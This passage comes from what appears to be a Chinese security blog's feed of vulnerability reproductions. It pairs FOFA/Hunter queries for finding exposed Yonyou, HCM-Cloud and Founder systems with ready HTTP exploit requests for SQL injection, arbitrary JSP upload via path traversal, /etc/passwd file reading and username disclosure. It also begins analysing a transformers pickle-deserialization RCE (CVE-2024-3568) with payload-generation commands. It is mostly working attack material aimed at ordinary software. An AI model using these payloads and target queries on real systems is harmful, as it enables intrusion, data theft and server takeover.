+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&amp;amp;method=getTaskRepTreeRef&amp;amp;taskId=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105153239.png&#34; alt=&#34;20241105153239&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;用友u8-crm系统接口attrlist存在sql注入漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用友u8-crm系统接口attrlist存在sql注入漏洞&#34;&gt;#&lt;/a&gt; 用友 U8-CRM 系统接口 attrlist 存在 SQL 注入漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;fofa语句-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa语句-2&#34;&gt;#&lt;/a&gt; fofa 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;app=&amp;quot;用友U8CRM
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;poc-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc-2&#34;&gt;#&lt;/a&gt; POC&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /devtools/tools/attrlist.php?DontCheckLogin=1&amp;amp;isquery=1 HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/x-www-form-urlencoded; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;obj_type=1&amp;#x27;;WAITFOR DELAY &amp;#x27;0:0:5&amp;#x27;--&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;验证-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证-2&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105153358.png&#34; alt=&#34;20241105153358&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;用友nc系统filemanager接口存在任意文件上传漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用友nc系统filemanager接口存在任意文件上传漏洞&#34;&gt;#&lt;/a&gt; 用友 NC 系统 FileManager 接口存在任意文件上传漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;介绍-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍-2&#34;&gt;#&lt;/a&gt; 介绍&lt;/h2&gt;
+&lt;p&gt;NC 系统可利用 /portal/pt/file/upload 接口中的 filename 参数及 billitem 参数实现任意文件上传，从而控制服务器&lt;/p&gt;
+&lt;h2 id=&#34;fofa语句-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa语句-3&#34;&gt;#&lt;/a&gt; fofa 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;app=&amp;quot;用友-UFIDA-NC&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;poc-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc-3&#34;&gt;#&lt;/a&gt; POC&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /portal/pt/file/upload?pageId=login&amp;amp;filemanager=nc.uap.lfw.file.FileManager&amp;amp;iscover=true&amp;amp;billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--d0b7a0d40eed0e32904c8017b09eb305&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;we.jsp&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: text/plain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%out.print(&amp;quot;hello world&amp;quot;);%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--d0b7a0d40eed0e32904c8017b09eb305--&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;验证-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证-3&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105154248.png&#34; alt=&#34;20241105154248&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;用友u8-cloud系统接口uapbdrefdefquery存在sql注入漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用友u8-cloud系统接口uapbdrefdefquery存在sql注入漏洞&#34;&gt;#&lt;/a&gt; 用友 U8-Cloud 系统接口 uapbd.refdef.query 存在 SQL 注入漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;介绍-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍-3&#34;&gt;#&lt;/a&gt; 介绍&lt;/h2&gt;
+&lt;p&gt;用友 U8-Cloud 系统接口 uapbd.refdef.query 存在 SQL 注入漏洞，允许攻击者通过恶意构造的 SQL 语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。&lt;/p&gt;
+&lt;h2 id=&#34;fofa语句-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa语句-4&#34;&gt;#&lt;/a&gt; fofa 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;title==&amp;quot;U8C&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;hunter语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hunter语句&#34;&gt;#&lt;/a&gt; hunter 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;app.name=&amp;quot;用友 U8 Cloud&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;poc-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc-4&#34;&gt;#&lt;/a&gt; POC&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&amp;amp;isEncrypt=N HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;refName&amp;quot;:&amp;quot;1%&amp;#x27; UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- &amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;验证-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证-4&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105154622.png&#34; alt=&#34;20241105154622&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/10/31/HCM-Cloud%E4%BA%91%E7%AB%AF%E4%B8%93%E4%B8%9A%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</guid>
+            <title>HCM-Cloud云端专业人力资源平台download任意文件读取漏洞</title>
+            <link>http://example.com/2024/10/31/HCM-Cloud%E4%BA%91%E7%AB%AF%E4%B8%93%E4%B8%9A%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</link>
+            <category>漏洞复现</category>
+            <pubDate>Thu, 31 Oct 2024 14:16:22 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;1-漏洞介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-漏洞介绍&#34;&gt;#&lt;/a&gt; 1、漏洞介绍&lt;/h1&gt;
+&lt;p&gt;HCM-Cloud 云端专业人力资源平台 download 任意文件读取漏洞&lt;/p&gt;
+&lt;h2 id=&#34;fofa&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa&#34;&gt;#&lt;/a&gt; fofa&lt;/h2&gt;
+&lt;p&gt;icon_hash=“-859381597”&lt;/p&gt;
+&lt;h2 id=&#34;poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc&#34;&gt;#&lt;/a&gt; poc&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /api/model_report/file/download?index=/&amp;amp;ext=/etc/passwd HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241031145132.png&#34; alt=&#34;20241031145132&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞来源&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞来源&#34;&gt;#&lt;/a&gt; 漏洞来源&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw&#34;&gt;https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw&lt;/a&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/10/28/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8syn.do%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</guid>
+            <title>方正全媒体采编系统存在syn.do信息泄露漏洞</title>
+            <link>http://example.com/2024/10/28/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8syn.do%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</link>
+            <category>漏洞复现</category>
+            <pubDate>Mon, 28 Oct 2024 16:33:09 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;方正全媒体采编系统存在syndo信息泄露漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#方正全媒体采编系统存在syndo信息泄露漏洞&#34;&gt;#&lt;/a&gt; 方正全媒体采编系统存在 syn.do 信息泄露漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;1-漏洞介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-漏洞介绍&#34;&gt;#&lt;/a&gt; 1、漏洞介绍&lt;/h2&gt;
+&lt;p&gt;​	方正全媒体采编系统存在 syn.do 信息泄露漏洞，攻击者可以查看到平台中所有用户的用户名。&lt;/p&gt;
+&lt;h2 id=&#34;2-fofa语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-fofa语句&#34;&gt;#&lt;/a&gt; 2、 fofa 语句&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;app=&amp;quot;FOUNDER-全媒体采编系统&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;3-poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-poc&#34;&gt;#&lt;/a&gt; 3、POC&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /newsedit/assess/syn.do?type=org HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 185Accept: */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;4-验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-验证&#34;&gt;#&lt;/a&gt; 4、验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1724056279042-c14e8c27-b358-4e33-97da-1c74b71c8427.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/10/28/huggingfaceRCE/</guid>
+            <title>huggingface/transformers RCE</title>
+            <link>http://example.com/2024/10/28/huggingfaceRCE/</link>
+            <category>漏洞复现</category>
+            <pubDate>Mon, 28 Oct 2024 10:24:04 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;huggingfacetransformers-rce漏洞分析-cve-2024-3568&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#huggingfacetransformers-rce漏洞分析-cve-2024-3568&#34;&gt;#&lt;/a&gt; huggingface/	transformers RCE 漏洞分析 （CVE-2024-3568）&lt;/h1&gt;
+&lt;h2 id=&#34;1-缘起&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-缘起&#34;&gt;#&lt;/a&gt; 1、缘起&lt;/h2&gt;
+&lt;p&gt;刚开始研究⼤模型安全的时候就看到 huggingface/transformers 有这个 load_repo_checkpoint 的漏洞，不过 当时看到说是利⽤起来⽐较困难就没有再深⼊研究（世上⽆难事，只要肯放弃），直到周五（2024-10-18）的时 候，看到各个技术群⾥都在转发字节跳动实习⽣对⼤模型投毒的聊天记录，故事情节相当精彩刺激，后来在知乎热 榜上也看到出现⾮常多的讨论，有兴趣的读者可⾃⾏吃⽠： &lt;a href=&#34;https://www.zhihu.com/question/1296528119&#34;&gt;字节跳动大模型训练被实习生恶意注入破坏代码，涉事者已被辞退，攻击带来的影响有多大？暴露出哪些问题？ - 知乎 (zhihu.com)&lt;/a&gt; 既然这个漏洞都已经能够在实际环境中产⽣危害了，感觉是有必要深⼊了解分析⼀下了&lt;/p&gt;
+&lt;h2 id=&#34;2-漏洞复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-漏洞复现&#34;&gt;#&lt;/a&gt; 2、漏洞复现&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;前置条件：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;安装的是 4.38.0 或之前的 transformer&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;pip install transformers==4.37.2&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt; pip install tensorflow&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;借助这个⼯具来进⾏漏洞复现：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://github.com/llm-sec/transformer-hacker&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;先⽣成⼀个带 checkpoint 的⽂件夹，执⾏的命令是 Mac 下的打开计算器命令：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python main.py --directory ./rce-checkpoint --model bert-base-uncased --command &#39;open  /System/Applications/Calculator.app&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/image-20241024155859447.png&#34; alt=&#34;image-20241024155859447&#34;&gt;&lt;/p&gt;
+&lt;p&gt;⽣成好了 payload 之后，然后执⾏下⾯的代码，⽤这段代码来模拟模型训练加载 加载⽣成的带有命令执⾏的 checkpoint 的仓库⽂件夹： checkpoint 的过程，在⾥⾯尝试：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from tensorflow.keras.optimizers import Adam&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; from transformers import TFAutoModel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # 这个模型还是有些⼤的，下载可能会花⼀些时间...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # https://huggingface.co/google-bert/bert-base-uncased/tree/main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model = TFAutoModel.from_pretrained(&amp;#x27;bert-base-uncased&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model.compile(optimizer=Adam(learning_rate=5e-5), loss=&amp;#x27;sparse_categorical_crossentropy&amp;#x27;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;metrics=[&amp;#x27;accuracy&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # 把参数修改为checkpoint所在的仓库的路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;model.load_repo_checkpoint(&amp;#x27;test_repo&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;在被加载的时候就能够执⾏任意命令，但是这⾥我们只是为了证明能够执⾏⽽不想产⽣实际危害，所以我们只是弹 出了⼀个计算器：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/image-20241028101410376.png&#34; alt=&#34;image-20241028101410376&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞原理分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞原理分析&#34;&gt;#&lt;/a&gt; 漏洞原理分析&lt;/h2&gt;
+&lt;p&gt;从⼤的流程上来说，就是 transformers 允许从检查点恢复预训练的⼀些进度，⽽所谓的 checkpoint 检查点其实 就是⼀个⽂件夹，结构⼤概是这样⼦的：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/image-20241028101443835.png&#34; alt=&#34;image-20241028101443835&#34;&gt;&lt;/p&gt;
+&lt;p&gt;⽂件夹名称 checkpoint 是约定的固定的名称，下⾯的两个⽂件：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;weights.h5 ：模型的权重⽂件，必须要是跟正在使⽤的模型架构对应的的权重，否则的话加载权重这⼀步就 会抛异常，⾛不到执⾏命令那⼀步，所以利⽤时要知道使⽤的是哪个模型架构，因为不同的架构可能有不同的 神经⽹络层数之类的&lt;/li&gt;
+&lt;li&gt;extra_data.pickle ：这个⽂件的初衷是存放⼀些元数据信息，只是保存⽅式选择的⽅式选择得不太合适， 为了⽅便直接⽤ pickle.dump 来保存，输出的是⼀个序列化的⽂件，⽽模型加载的时候要读取对应的元数据 信息，就会使⽤ pickle.load (f) 来加载这个⽂件，从⽽利⽤反序列化漏洞进⾏ RCE。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;下⾯来看⼀下 poc 代码，追⼀下源代码看看漏洞到底是怎么产⽣的，可以看到是在 model.load_repo_checkpoint ⽅法读取了有问题的 checkpoint ：&lt;/p&gt;
